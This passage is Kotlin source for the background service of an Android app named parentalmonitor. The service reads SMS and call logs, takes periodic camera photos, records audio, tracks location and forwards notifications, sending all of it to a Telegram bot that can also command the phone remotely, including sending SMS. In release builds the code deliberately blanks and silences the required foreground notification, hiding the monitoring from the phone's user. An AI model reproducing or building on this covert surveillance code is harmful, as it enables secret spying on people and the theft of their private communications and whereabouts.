package com.redeye.parentalmonitor.service

import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.redeye.parentalmonitor.ParentalMonitorApp
import com.redeye.parentalmonitor.R
import com.redeye.parentalmonitor.data.MessageQueue
import com.redeye.parentalmonitor.data.PreferencesManager
import com.redeye.parentalmonitor.network.TelegramClient
import com.redeye.parentalmonitor.network.TelegramMessage
import com.redeye.parentalmonitor.utils.CrashReporter
import com.redeye.parentalmonitor.utils.Html
import com.redeye.parentalmonitor.utils.MessageScheduler
import com.redeye.parentalmonitor.repository.CallLogRepository
import com.redeye.parentalmonitor.repository.SmsRepository
import com.redeye.parentalmonitor.utils.NetworkUtils
import com.redeye.parentalmonitor.utils.TimeFmt
import kotlinx.coroutines.*
import android.os.BatteryManager
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.File
import java.util.concurrent.atomic.AtomicBoolean

class MonitoringService : Service() {

    private lateinit var preferencesManager: PreferencesManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var messageQueue: MessageQueue
    private lateinit var cameraService: CameraService
    
    private val scopeErrorHandler = CoroutineExceptionHandler { _, error ->
        try {
            CrashReporter.saveNow(this, error)
        } catch (_: Exception) {
        }
        android.util.Log.e("MonitoringService", "Background failure recorded: ${redactToken(error.message)}")
    }
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob() + scopeErrorHandler)
    private val cameraBusy = AtomicBoolean(false)
    private val ringBusy = AtomicBoolean(false)
    private val recordBusy = AtomicBoolean(false)
    private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
    @Volatile
    private var activeAudioFile: File? = null
    private var ringJob: Job? = null
    private var recordJob: Job? = null
    private var watchdogJob: Job? = null
    private var loopWatchdogJob: Job? = null
    private var loopWatchdogNoticeAt = 0L
    private var serviceStartAt = 0L
    private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
    private var monitoringJob: Job? = null
    private var cameraJob: Job? = null
    private var commandJob: Job? = null
    private var initialSyncJob: Job? = null
    private val initialSyncStarted = java.util.concurrent.atomic.AtomicBoolean(false)
    private val initialSyncRunning = java.util.concurrent.atomic.AtomicBoolean(false)
    private var cachedBotToken = ""
    private var cachedChatId = ""
    private var credsListener: android.content.SharedPreferences.OnSharedPreferenceChangeListener? = null
    private var credsCheckAt = 0L
    private var netCheckAt = 0L
    private var netCached = false
    private var cachedCameraInterval = -1
    private var cachedMonitoringPaused = false
    private var cachedPhotoPausedUntil = 0L
    private var cachedSyncInterval = -1

    companion object {
        const val ACTION_START_MONITORING = "START_MONITORING"
        private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{3,15}$")
        private val TAG_STRIP_REGEX = Regex("<[^>]*>")
        const val ACTION_STOP_MONITORING = "STOP_MONITORING"
        private const val COMMAND_MAX_AGE_SEC = 900L
        private const val NOTIFICATION_ID = 1
        private const val MAX_AUDIO_KEPT = 5
        private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
        @Volatile
        var isRunning = false

        fun touchHeartbeat(context: android.content.Context) {
            try {
                val file = File(context.cacheDir, "monitor_heartbeat")
                try {
                    file.writeText(android.os.SystemClock.elapsedRealtime().toString())
                } catch (_: Exception) {
                    try {
                        if (!file.exists()) file.createNewFile()
                    } catch (_: Exception) {
                    }
                    file.setLastModified(System.currentTimeMillis())
                }
            } catch (_: Exception) {
            }
        }

        fun heartbeatFresh(context: android.content.Context, maxAgeMs: Long = 10 * 60_000L): Boolean {
            return try {
                val file = File(context.cacheDir, "monitor_heartbeat")
                if (!file.exists()) return false
                val stored = try {
                    file.readText().trim().toLong()
                } catch (_: Exception) {
                    return false
                }
                val now = android.os.SystemClock.elapsedRealtime()
                now >= stored && now - stored < maxAgeMs
            } catch (_: Exception) {
                false
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        try { PreferencesManager.refreshInstance(this) } catch (_: Exception) { }
        preferencesManager = PreferencesManager.getInstance(this)
        refreshCreds()
        refreshLoopConfig()
        credsListener = android.content.SharedPreferences.OnSharedPreferenceChangeListener { _, key ->
            if (key == "bot_token" || key == "chat_id") refreshCreds()
            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until" || key == "sync_interval") refreshLoopConfig()
            if (key == "camera_interval" || key == "monitoring_paused" || key == "photo_paused_until") restartCameraLoop()
        }
        try { credsListener?.let { preferencesManager.registerChangeListener(it) } } catch (_: Exception) { }
        smsRepository = SmsRepository(this)
        callLogRepository = CallLogRepository(this)
        messageQueue = MessageQueue.getInstance(this)
        cameraService = CameraService(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START_MONITORING -> {
                startMonitoring()
                return START_STICKY
            }
            ACTION_STOP_MONITORING -> {
                stopMonitoring()
                return START_NOT_STICKY
            }
            else -> {
                if (shouldAutoResume()) {
                    startMonitoring()
                    return START_STICKY
                } else if (needsCredsRetry()) {
                    MessageScheduler.scheduleBootRestart(this)
                    return START_NOT_STICKY
                } else {
                    stopSelf()
                    return START_NOT_STICKY
                }
            }
        }
    }

    private fun shouldAutoResume(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }

    private fun needsCredsRetry(): Boolean {
        return try {
            preferencesManager.isMonitoringEnabled && !preferencesManager.isConfigured() && !preferencesManager.userDisabledMonitoring && preferencesManager.userConsentedMonitoring
        } catch (_: Exception) {
            false
        }
    }


    private fun sha256Hex(value: String): String {
        return try {
            val digest = java.security.MessageDigest.getInstance("SHA-256").digest(value.toByteArray(Charsets.UTF_8))
            digest.joinToString("") { "%02x".format(it) }
        } catch (_: Exception) {
            value.hashCode().toString()
        }
    }

    private fun redactToken(value: String?): String {
        if (value.isNullOrEmpty()) return value ?: ""
        val token = try {
            cachedBotToken.ifEmpty { preferencesManager.botToken }
        } catch (_: Exception) {
            ""
        }
        if (token.isEmpty()) return value
        return value.replace(token, "***")
    }

    private fun startMonitoring() {
        try {
            if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
                android.util.Log.w("MonitoringService", "Monitoring disabled by user; not starting")
                stopMonitoring()
                return
            }
        } catch (_: Exception) {
        }
        if (monitoringJob?.isActive == true && cameraJob?.isActive == true && commandJob?.isActive == true) {
            refreshCreds()
            return
        }
        serviceStartAt = System.currentTimeMillis()
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "=== Starting monitoring service ===")

        // Cancel any previous loops so a restart never duplicates work
        monitoringJob?.cancel()
        cameraJob?.cancel()
        commandJob?.cancel()
        initialSyncJob?.cancel()
        idlePolls = 0
        refreshCreds()
        refreshLoopConfig()

        // In RELEASE mode, make notification invisible/minimal
        val notificationBuilder = NotificationCompat.Builder(this, ParentalMonitorApp.CHANNEL_ID)
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
        
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) {
            // DEBUG: Show detailed notification
            notificationBuilder
                .setContentTitle(getString(R.string.notification_title))
                .setContentText(getString(R.string.notification_text))
        } else {
            // RELEASE: Minimal/hidden notification
            notificationBuilder
                .setContentTitle("")
                .setContentText("")
                .setShowWhen(false)
                .setSound(null)
                .setVibrate(null)
                .setSilent(true)
        }

        var foregroundTypes = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasCameraPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (hasMicPermission()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
        }
        if (hasLocationPermission() && hasBackgroundLocation()) {
            foregroundTypes = foregroundTypes or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        val foregroundNotification = try {
            notificationBuilder.build()
        } catch (_: Exception) {
            stopSelf()
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, foregroundNotification, foregroundTypes)
            } else {
                startForeground(NOTIFICATION_ID, foregroundNotification)
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Foreground start failed, retrying minimal: ${redactToken(e.message)}")
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    startForeground(
                        NOTIFICATION_ID,
                        foregroundNotification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    )
                } else {
                    startForeground(NOTIFICATION_ID, foregroundNotification)
                }
            } catch (_: Exception) {
                stopSelf()
                return
            }
        }
        isRunning = true
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Foreground notification started (with camera type)")
        if (!preferencesManager.isStorageEncrypted && storageWarnAt.compareAndSet(0L, System.currentTimeMillis())) {
            serviceScope.launch {
                sendToTelegram("Storage fallback active: secure storage unavailable, data kept in volatile memory until Setup is reopened.")
            }
        }

        if (!preferencesManager.initialSyncDone && !preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
            preferencesManager.initialSyncStarted = true
            initialSyncRunning.set(true)
        } else if (!preferencesManager.initialSyncDone && preferencesManager.initialSyncStarted && initialSyncStarted.compareAndSet(false, true)) {
            initialSyncRunning.set(true)
        }
        startPeriodicLoops()
        initialSyncJob = serviceScope.launch {
            try {
                if (initialSyncRunning.get()) {
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Starting initial data collection...")
                    sendInitialData()
                    if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Initial data collection completed")
                }
            } catch (_: Exception) {
            } finally {
                initialSyncRunning.set(false)
            }
        }
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "Monitoring loop started")
        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MonitoringService", "📸 Camera monitoring started")
        try {
            messageQueue.tryRestorePersistent()
        } catch (_: Exception) {
        }
        val stuckRing = preferencesManager.ringPrevVolume
        val ringSavedAt = preferencesManager.ringSavedAt
        if (stuckRing >= 0 && ringSavedAt > 0 && System.currentTimeMillis() - ringSavedAt < 12 * 60 * 60_000L) {
            try {
                val audioManager = getSystemService(AUDIO_SERVICE) as android.media.AudioManager
                audioManager.setStreamVolume(android.media.AudioManager.STREAM_ALARM, stuckRing, 0)
            } catch (_: Exception) {
            }
            preferencesManager.ringPrevVolume = -1
            preferencesManager.ringSavedAt = 0L
        }
        startCommandPolling()
        startLoopWatchdog()
        MessageScheduler.scheduleWatchdog(this)
        MessageScheduler.scheduleMessageSend(this)
        serviceScope.launch {
            registerBotCommands()
        }
    }

    private fun startPeriodicLoops() {
        monitoringJob = serviceScope.launch {
            while (isActive && monitoringJob === coroutineContext[Job]) {
                try {
                    if (!cachedMonitoringPaused) {
                        checkAndSendNewData()
                        touchHeartbeat(this@MonitoringService)
                        chunkedDelay(syncIntervalMillis())
                    } else {
                        chunkedDelay(15 * 60_000L)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in monitoring loop: ${redactToken(e.message)}")
                }
            }
        }
        startCameraLoop()
    }

    private fun restartCameraLoop() {
        try {
            cameraJob?.cancel()
        } catch (_: Exception) {
        }
        startCameraLoop()
    }

    private fun startCameraLoop() {
        cameraJob = serviceScope.launch {
            while (isActive && cameraJob === coroutineContext[Job]) {
                try {
                    if (cachedCameraInterval < 0) refreshLoopConfig()
                    val minutes = cachedCameraInterval.coerceIn(0, 60)
                    val paused = android.os.SystemClock.elapsedRealtime() < cachedPhotoPausedUntil
                    if (!cachedMonitoringPaused && !paused && minutes > 0) {
                        captureAndSendPhoto()
                        chunkedDelay(minutes * 60_000L)
                    } else if (cachedMonitoringPaused) {
                        chunkedDelay(5 * 60_000L)
                    } else {
                        val remaining = cachedPhotoPausedUntil - android.os.SystemClock.elapsedRealtime()
                        val idle = if (remaining > 0) remaining.coerceAtMost(30 * 60_000L) else 30 * 60_000L
                        chunkedDelay(idle)
                    }
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error in camera loop: ${redactToken(e.message)}")
                }
            }
        }
    }

    private suspend fun chunkedDelay(totalMs: Long) {
        if (totalMs <= 0L) return
        var remaining = totalMs
        while (remaining > 0L) {
            currentCoroutineContext().ensureActive()
            val step = remaining.coerceAtMost(5_000L)
            delay(step)
            remaining -= step
        }
    }

    private fun refreshCreds() {
        try {
            cachedBotToken = preferencesManager.botToken
            cachedChatId = preferencesManager.chatId
        } catch (_: Exception) {
        }
    }

    private fun refreshLoopConfig() {
        try {
            cachedCameraInterval = preferencesManager.cameraInterval
            cachedMonitoringPaused = preferencesManager.monitoringPaused
            cachedPhotoPausedUntil = photoPausedElapsed()
            cachedSyncInterval = preferencesManager.syncInterval
        } catch (_: Exception) {
        }
    }

    private fun sendCreds(): Pair<String, String> {
        if (cachedBotToken.isEmpty() || cachedChatId.isEmpty()) refreshCreds()
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - credsCheckAt > 300_000L) {
            credsCheckAt = now
            refreshCreds()
        }
        return cachedBotToken to cachedChatId
    }

    private fun hasNetwork(): Boolean {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - netCheckAt < 20_000L) return netCached
        netCheckAt = now
        netCached = NetworkUtils.isNetworkAvailable(this)
        return netCached
    }

    // ═══════════════════════════════════════════════════════════
    // TELEGRAM COMMAND POLLING (/photo, /status, /help)
    // ═══════════════════════════════════════════════════════════

    private var idlePolls = 0

    private fun startCommandPolling() {
        commandJob = serviceScope.launch {
            while (isActive && commandJob === coroutineContext[Job]) {
                if (cachedMonitoringPaused) {
                    try {
                        pollTelegramCommands()
                        touchHeartbeat(this@MonitoringService)
                    } catch (e: kotlinx.coroutines.CancellationException) {
                        throw e
                    } catch (e: Exception) {
                        android.util.Log.e("MonitoringService", "Error polling commands while paused: ${redactToken(e.message)}")
                    }
                    delay(60_000)
                    continue
                }
                try {
                    val active = pollTelegramCommands()
                    idlePolls = if (active) 0 else (idlePolls + 1).coerceAtMost(4)
                    touchHeartbeat(this@MonitoringService)
                } catch (e: kotlinx.coroutines.CancellationException) {
                    throw e
                } catch (e: Exception) {
                    android.util.Log.e("MonitoringService", "Error polling commands: ${redactToken(e.message)}")
                }
                if (!preferencesManager.isConfigured()) {
                    try {
                        if (PreferencesManager.refreshInstance(this@MonitoringService)) {
                            preferencesManager = PreferencesManager.getInstance(this@MonitoringService)
                            refreshCreds()
                            refreshLoopConfig()
                            try {
                                credsListener?.let { preferencesManager.registerChangeListener(it) }
                            } catch (_: Exception) {
                            }
                        }
                    } catch (_: Exception) {
                    }
                    delay(60_000)
                } else if (!hasNetwork()) {
                    delay(60_000)
                } else if (authBlocked()) {
                    delay(300_000)
                } else {
                    delay((15_000L + idlePolls * 10_000L).coerceAtMost(60_000L))
                }
            }
        }
    }

    private fun authBlocked(): Boolean {
        return try {
            val err = preferencesManager.credentialError
            if (err.isEmpty()) return false
            val now = android.os.SystemClock.elapsedRealtime()
            if (now < preferencesManager.credentialErrorAt) {
                preferencesManager.credentialError = ""
                preferencesManager.credentialErrorAt = 0L
                return false
            }
            now - preferencesManager.credentialErrorAt < 30 * 60_000L
        } catch (_: Exception) {
            false
        }
    }

    private suspend fun pollTelegramCommands(): Boolean {
        if (authBlocked()) return false
        val (botToken, chatId) = sendCreds()
        if (botToken.isEmpty() || chatId.isEmpty()) return false

        val offset = preferencesManager.lastUpdateId + 1
        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=10"

        val response = try {
            TelegramClient.api.getUpdates(url)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            return false
        }
        if (response.code() == 401 || response.code() == 403) {
            try {
                preferencesManager.credentialError = response.code().toString()
                preferencesManager.credentialErrorAt = android.os.SystemClock.elapsedRealtime()
            } catch (_: Exception) {
            }
            return false
        }
        if (response.code() == 400) {
            return false
        }
        if (!response.isSuccessful || response.body()?.ok != true) return false
        try {
            preferencesManager.credentialError = ""
            preferencesManager.credentialErrorAt = 0L
        } catch (_: Exception) {
        }

        val updates = response.body()?.result ?: return false
        if (updates.isEmpty()) return false
        for (update in updates) {
            try {
                if (update.updateId > preferencesManager.lastUpdateId) {
                    preferencesManager.lastUpdateId = update.updateId
                }
            } catch (_: Exception) {
            }
            val callback = update.callbackQuery
            if (callback != null) {
                handleCallbackQuery(callback)
                continue
            }
            val message = update.message ?: update.editedMessage ?: continue
            if (message.chat.id.toString() != chatId) continue
            val full = (message.text ?: message.caption)?.trim() ?: continue
            val raw = full.substringBefore("@").lowercase(java.util.Locale.ROOT)
            if (!raw.startsWith("/")) continue
            val input = if (raw == "/sms" || raw.startsWith("/sms ")) {
                val smsArg = full.substringAfter(" ", "").trim()
                if (smsArg.isEmpty()) "/sms" else "/sms $smsArg"
            } else raw
            handleTelegramCommand(input, message.date)
        }
        return true
    }

    private suspend fun handleCallbackQuery(query: com.redeye.parentalmonitor.network.TelegramCallbackQuery) {
        val sender = query.from?.id?.toString() ?: return
        if (sender != preferencesManager.chatId) return
        answerCallback(query.id)
        val command = when (query.data) {
            "photo" -> "/photo"
            "location" -> "/location"
            "lastcalls" -> "/lastcalls"
            "lastsms" -> "/lastsms"
            "battery" -> "/battery"
            "status" -> "/status"
            "stop" -> "/stop"
            "resume" -> "/resume"
            "camfront" -> "/camera depan"
            "camback" -> "/camera belakang"
            "pause60" -> "/pause 60"
            else -> return
        }
        handleTelegramCommand(command)
    }

    private suspend fun answerCallback(callbackId: String) {
        try {
            val token = sendCreds().first.ifEmpty { preferencesManager.botToken }
            val url = "https://api.telegram.org/bot${token}/answerCallbackQuery"
            TelegramClient.api.answerCallbackQuery(url, mapOf("callback_query_id" to callbackId))
        } catch (_: Exception) {
        }
    }

    private fun botCommandList(): List<com.redeye.parentalmonitor.network.BotCommand> {
        return listOf(
            com.redeye.parentalmonitor.network.BotCommand("photo", "Take a photo now"),
            com.redeye.parentalmonitor.network.BotCommand("camera", "Switch camera: /camera depan|belakang"),
            com.redeye.parentalmonitor.network.BotCommand("location", "Send current location"),
            com.redeye.parentalmonitor.network.BotCommand("lastcalls", "Show last 5 calls"),
            com.redeye.parentalmonitor.network.BotCommand("lastsms", "Show last 5 SMS"),
            com.redeye.parentalmonitor.network.BotCommand("photointerval", "Set photo interval 0-60 min"),
            com.redeye.parentalmonitor.network.BotCommand("pause", "Pause photos for N minutes"),
            com.redeye.parentalmonitor.network.BotCommand("battery", "Show battery level"),
            com.redeye.parentalmonitor.network.BotCommand("status", "Show monitoring status"),
            com.redeye.parentalmonitor.network.BotCommand("stop", "Pause monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("resume", "Resume monitoring"),
            com.redeye.parentalmonitor.network.BotCommand("notif", "Notif forwarding: /notif on|off|status"),
            com.redeye.parentalmonitor.network.BotCommand("syncinterval", "Set sync interval 1-1440 min"),
            com.redeye.parentalmonitor.network.BotCommand("restart", "Restart monitoring loops"),
            com.redeye.parentalmonitor.network.BotCommand("flush", "Send queued messages now"),
            com.redeye.parentalmonitor.network.BotCommand("clearqueue", "Drop queued messages"),
            com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
            com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
            com.redeye.parentalmonitor.network.BotCommand("ping", "Check bot delay"),
            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
            com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms nomor pesan"),
            com.redeye.parentalmonitor.network.BotCommand("smsconfirm", "Confirm pending SMS"),
            com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
            com.redeye.parentalmonitor.network.BotCommand("version", "Show app/device version"),
            com.redeye.parentalmonitor.network.BotCommand("uptime", "Show service uptime"),
            com.redeye.parentalmonitor.network.BotCommand("contacts", "Search contacts: /contacts nama"),
            com.redeye.parentalmonitor.network.BotCommand("apps", "List installed apps"),
            com.redeye.parentalmonitor.network.BotCommand("storage", "Show storage usage"),
            com.redeye.parentalmonitor.network.BotCommand("history", "Calls+SMS by number"),
            com.redeye.parentalmonitor.network.BotCommand("log", "Show last crash/error log"),
            com.redeye.parentalmonitor.network.BotCommand("help", "Show all commands")
        )
    }

    private suspend fun registerBotCommands() {
        try {
            val botToken = preferencesManager.botToken
            if (botToken.isEmpty()) return
            val tokenHash = sha256Hex(botToken)
            try {
                if (preferencesManager.commandsTokenHash == tokenHash) return
            } catch (_: Exception) {
            }
            val url = "https://api.telegram.org/bot$botToken/setMyCommands"
            val body = com.redeye.parentalmonitor.network.SetMyCommandsRequest(botCommandList())
            val response = TelegramClient.api.setMyCommands(url, body)
            if (response.isSuccessful && response.body()?.ok == true) {
                try {
                    preferencesManager.commandsTokenHash = tokenHash
                } catch (_: Exception) {
                }
                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "Bot command menu registered")
            } else {
                android.util.Log.w("MonitoringService", "Command menu registration failed: ${response.code()}")
            }
        } catch (e: Exception) {
            android.util.Log.w("MonitoringService", "Command menu registration error: ${redactToken(e.message)}")
        }
    }

    private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
        fun button(text: String, data: String) =
            com.redeye.parentalmonitor.network.InlineButton(text, data)
        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
            listOf(
                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
                listOf(button("\uD83D\uDCF7 Depan", "camfront"), button("\uD83D\uDCF7 Belakang", "camback")),
                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status"))
            )
        )
    }

    private suspend fun handleTelegramCommand(raw: String, sentAtSec: Long = 0L) {
        if (sentAtSec > 0 && System.currentTimeMillis() / 1000L - sentAtSec > COMMAND_MAX_AGE_SEC) {
            sendToTelegram("\u23F3\uFE0F Command kedaluwarsa (dikirim > ${COMMAND_MAX_AGE_SEC / 60} menit lalu). Kirim ulang.")
            return
        }
        val parts = raw.split("\\s+".toRegex(), limit = 2)
        val command = parts[0]
        val arg = parts.getOrNull(1)?.trim().orEmpty()
        try {
            handleTelegramCommandInner(command, arg, sentAtSec)
        } catch (e: kotlinx.coroutines.CancellationException) {
            throw e
        } catch (e: Exception) {
            android.util.Log.e("MonitoringService", "Command failed: $command (${redactToken(e.message)})")
            try {
                val detail = redactToken(e.message).ifEmpty { "unknown error" }
                sendToTelegram("\u26A0\uFE0F Command $command failed ($detail). Please try again or send /help.")
            } catch (_: Exception) {
            }
        }
    }

    private suspend fun handleTelegramCommandInner(command: String, arg: String, sentAtSec: Long = 0L) {
        when (command) {
            "/photo" -> {
                val lens = arg.substringBefore(" ")
                if (lens.isNotEmpty()) {
                    when (lens) {
                        "belakang", "back" -> preferencesManager.cameraFacing = "back"
                        "depan", "front" -> preferencesManager.cameraFacing = "front"
                        else -> {
                            sendToTelegram("Usage: /photo [depan|belakang]")
                            return
                        }
                    }
                }
                if (preferencesManager.monitoringPaused) {
                    sendToTelegram("⏸️ Monitoring is paused. Send /resume first.")
                } else {
                    sendToTelegram("📸 Taking photo now…")
                    captureAndSendPhoto(reportResult = true)
                }
            }
            "/status" -> {
                val lastSync = preferencesManager.lastSyncTime
                val lastSyncStr = if (lastSync > 0) formatDate(lastSync) else "never"
                val photoState = if (isPhotoPaused()) {
                    val leftMin = ((photoPausedElapsed() - android.os.SystemClock.elapsedRealtime()) / 60_000L).coerceAtLeast(1L)
                    "paused ($leftMin min left)"
                } else if (preferencesManager.cameraInterval <= 0) {
                    "manual only (/photo)"
                } else {
                    "every ${preferencesManager.cameraInterval} min"
                }
                sendToTelegram(
                    buildString {
                        appendLine("📊 <b>Status</b>")
                        appendLine("Monitoring: ${if (preferencesManager.monitoringPaused) "PAUSED" else "ON"}")
                        appendLine("Last sync: $lastSyncStr")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Data interval: ${preferencesManager.syncInterval} min")
                        appendLine("Photos: $photoState")
                        appendLine("Camera: ${preferencesManager.cameraFacing}")
                        appendLine("Camera permission: ${if (hasCameraPermission()) "granted" else "MISSING"}")
                        appendLine("Location permission: ${if (hasLocationPermission()) "granted" else "MISSING"}")
                        appendLine("Background location: ${if (hasBackgroundLocation()) "granted" else "MISSING"}")
                        appendLine("Notifications: ${if (isNotifForwarding()) "forwarding" else "off"}")
                        appendLine("Last photo: ${if (preferencesManager.lastPhotoTime > 0) formatDate(preferencesManager.lastPhotoTime) else "never"}")
                    }
                )
            }
            "/lastcalls" -> {
                val calls = callLogRepository.getAllCalls(5)
                if (calls.isEmpty()) {
                    sendToTelegram("📞 No call history found.")
                } else {
                    sendToTelegram(formatCallMessage(calls))
                }
            }
            "/lastsms" -> {
                val sms = smsRepository.getRecentSms(5)
                if (sms.isEmpty()) {
                    sendToTelegram("💬 No SMS found.")
                } else {
                    sendToTelegram(formatSmsMessage(sms))
                }
            }
            "/photointerval" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(0, 60)
                if (minutes == null) {
                    sendToTelegram("Usage: /photointerval \u003c0-60\u003e (0 = manual only)")
                } else if (minutes == 0) {
                    preferencesManager.cameraInterval = 0
                    sendToTelegram("📸 Automatic photos OFF. Use /photo for manual capture.")
                } else {
                    preferencesManager.cameraInterval = minutes
                    sendToTelegram("📸 Photo interval set to $minutes min.")
                }
            }
            "/pause" -> {
                val minutes = arg.toIntOrNull()?.coerceIn(1, 480)
                if (minutes == null) {
                    sendToTelegram("Usage: /pause \u003cminutes\u003e (1-480)")
                } else {
                    preferencesManager.photoPausedUntil = android.os.SystemClock.elapsedRealtime() + minutes * 60_000L
                    sendToTelegram("⏸️ Photos paused for $minutes min.")
                }
            }
            "/battery" -> {
                val batteryManager = getSystemService(BATTERY_SERVICE) as BatteryManager
                val level = batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
                val levelText = if (level in 0..100) "$level%" else "unknown"
                sendToTelegram("🔋 <b>Battery</b>\nLevel: $levelText")
            }
            "/stop" -> {
                preferencesManager.monitoringPaused = true
                sendToTelegram("⏸️ Monitoring paused. Send /resume to restart.")
            }
            "/resume" -> {
                preferencesManager.monitoringPaused = false
                preferencesManager.photoPausedUntil = 0L
                sendToTelegram("▶️ Monitoring resumed.")
            }
            "/location" -> {
                if (!hasLocationPermission()) {
                    sendToTelegram("⚠️ Location permission missing. Open Setup and grant Location permission.")
                } else {
                    sendToTelegram("📍 Locating…")
                    serviceScope.launch {
                        val location = fetchLocation()
                        if (location == null) {
                            sendToTelegram("⚠️ Location unavailable. Make sure Location/GPS is turned on.")
                        } else {
                            sendToTelegram("📍 <b>Location</b>\nhttps://maps.google.com/?q=${location.latitude},${location.longitude}\nAccuracy: ${location.accuracy.toInt()} m")
                    }
                    }
                }
            }
            "/camera" -> {
                when (arg) {
                    "belakang", "back" -> {
                        preferencesManager.cameraFacing = "back"
                        sendToTelegram("📸 Camera set to back.")
                    }
                    "depan", "front" -> {
                        preferencesManager.cameraFacing = "front"
                        sendToTelegram("📸 Camera set to front.")
                    }
                    else -> {
                        sendToTelegram("Usage: /camera \u003cdepan|belakang\u003e (now: ${preferencesManager.cameraFacing})")
                    }
                }
            }
            "/notif" -> {
                when (arg.lowercase()) {
                    "on" -> {
                        preferencesManager.notifForwardEnabled = true
                        if (isNotifForwarding()) {
                            sendToTelegram("\uD83D\uDD14 Notification forwarding ON.")
                        } else {
                            sendToTelegram("Notif forwarding enabled, but OS notification access is missing. Open Setup and tap Read Notifications to allow it.")
                        }
                    }
                    "off" -> {
                        preferencesManager.notifForwardEnabled = false
                        sendToTelegram("\uD83D\uDD15 Notification forwarding OFF.")
                    }
                    "status", "" -> {
                        val state = if (isNotifForwarding()) "forwarding" else "off"
                        sendToTelegram("\uD83D\uDD14 Notifications: $state (pref: ${if (preferencesManager.notifForwardEnabled) "on" else "off"})")
                    }
                    else -> {
                        sendToTelegram("Usage: /notif <on|off|status>")
                    }
                }
            }
            "/log" -> {
                val crash = try {
                    CrashReporter.pendingReport(this)
                } catch (_: Exception) {
                    null
                }
                if (crash != null) {
                    sendToTelegram(crash)
                    CrashReporter.clearPending(this)
                } else {
                    sendToTelegram("\uD83E\uDDFE No crash recorded.")
                }
                sendToTelegram(
                    buildString {
                        appendLine("\uD83E\uDDFE <b>Error log</b>")
                        val credErr = try {
                            preferencesManager.credentialError
                        } catch (_: Exception) {
                            ""
                        }
                        appendLine("Auth: " + if (credErr.isEmpty()) "OK" else "FAILED ($credErr)")
                        appendLine("Queued: ${messageQueue.getQueueSize()}")
                        appendLine("Storage: " + if (preferencesManager.isStorageEncrypted) "encrypted" else "volatile")
                        val camErr = try {
                            preferencesManager.lastCameraErrorNotice
                        } catch (_: Exception) {
                            0L
                        }
